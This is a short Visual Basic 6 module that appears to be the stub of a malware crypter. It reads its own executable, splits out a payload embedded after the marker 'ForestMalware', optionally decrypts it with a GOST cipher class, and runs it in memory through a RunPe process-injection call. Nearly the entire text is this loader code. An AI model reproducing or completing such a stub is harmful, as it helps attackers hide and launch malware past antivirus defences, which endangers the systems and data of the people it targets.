Attribute VB_Name = "Module1"
Dim sDatas As String, sBreak() As String, strDatas() As Byte
Dim EnGost As New clsGost



Sub Main()
Open App.Path & "\" & App.EXEName & ".exe" For Binary As 1
sDatas = Space(LOF(1))
Get 1, , sDatas
Close 1

sBreak = Split(sDatas, "ForestMalware")

If sBreak(2) = "EnGost" Then
 sBreak(1) = EnGost.DecryptString(sBreak(1), sBreak(3))
End If


strDatas() = StrConv(sBreak(1), vbFromUnicode)

Call RunPe(App.Path & "\" & App.EXEName & ".exe", strDatas(), Command)

End Sub


